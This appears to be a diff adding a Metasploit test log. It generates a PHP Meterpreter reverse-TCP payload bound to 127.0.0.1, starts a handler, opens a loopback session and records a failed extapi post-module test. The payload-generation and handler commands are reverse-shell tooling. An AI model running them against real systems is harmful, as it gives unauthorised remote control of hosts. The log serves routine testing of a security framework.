@@ -1,0 +1,17 @@
+use php/meterpreter_reverse_tcp
+msf6 post(test/cmd_exec) > generate -o D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220128-2820-1ursky5.php -f raw lport=6015 lhost=127.0.0.1
+msf6 payload(php/meterpreter_reverse_tcp) > [*] Writing 34276 bytes to D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220128-2820-1ursky5.php...
+msf6 payload(php/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 14
+msf6 payload(php/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6015 
+[*] Meterpreter session 15 opened (127.0.0.1:6015 -> 127.0.0.1:50063 ) at 2022-01-28 21:11:28 +0000
+use test/extapi
+msf6 post(test/extapi) > run session=15 addentropy=true verbose=true
+[*] Loading extapi extension...
+[-] Post failed: Rex::Post::Meterpreter::ExtensionLoadError The "extapi" extension is not supported by this Meterpreter type (php/windows)
+[-] Call stack:
+[-]   D:/a/metasploit-framework/metasploit-framework/test/modules/post/test/extapi.rb:32:in `setup'
+[*] Post module execution completed
+msf6 post(test/extapi) > 
